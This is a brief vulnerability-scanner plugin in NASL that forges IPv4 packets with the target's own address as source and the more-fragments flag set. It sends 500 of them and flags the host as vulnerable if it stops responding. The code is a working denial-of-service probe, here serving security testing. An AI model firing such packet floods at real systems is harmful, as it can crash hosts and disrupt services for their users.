
if(description)	{
	script_name(english:"Forging Packet IP");
	script_summary(english:"Creates packet with any data or option");
	script_category(ACT_DENIAL);
	script_copyright(english:"This script was written by Riccardo Melioli");
	exit(0);
}

src = get_host_ip();
data = string("Test packet data");

# Create IP packet
ip = forge_ip_packet(ip_v : 4,
			 ip_hl : 5,
		     ip_tos : 0,
		     ip_off : IP_MF,
		     ip_src : src,
		     ip_ttl : 64,
			 data : data
);

start_denial();
send_packet(ip) x 500;
alive = end_denial();

if (!alive){
	set_kb_item(name:"Host/dead", value:TRUE);
	security_hole(0);
}